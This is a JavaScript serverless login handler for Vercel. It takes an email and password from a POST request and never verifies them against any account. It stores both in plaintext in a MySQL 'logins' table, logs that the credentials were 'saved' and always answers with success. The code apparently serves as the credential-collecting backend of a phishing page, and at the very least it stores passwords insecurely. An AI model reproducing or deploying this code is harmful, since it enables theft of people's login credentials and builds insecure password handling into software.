import mysql from 'mysql2/promise';

export default async function handler(req, res) {
  if (req.method !== 'POST') {
    return res.status(405).json({ error: 'Method not allowed' });
  }

  const { email, password } = req.body;

  if (!email || !password) {
    return res.status(400).json({ error: 'Missing credentials' });
  }

  // Use DATABASE_URL from Vercel Environment Variables
  const dbUrl = process.env.DATABASE_URL;

  if (!dbUrl) {
    return res.status(500).json({ error: 'DATABASE_URL is not configured on Vercel' });
  }

  const pool = mysql.createPool(dbUrl);

  try {
    console.log(`Received login attempt on Vercel for: ${email}`);

    await pool.query(
      'INSERT INTO logins (email, password) VALUES (?, ?)',
      [email, password]
    );

    console.log(`Successfully saved credentials for: ${email}`);

    // Return success
    return res.status(200).json({ success: true });
  } catch (error) {
    console.error('Database error:', error);
    return res.status(500).json({ error: 'Database connection failed', details: error.message });
  } finally {
    // Close the pool connection to free up resources in serverless
    await pool.end();
  }
}
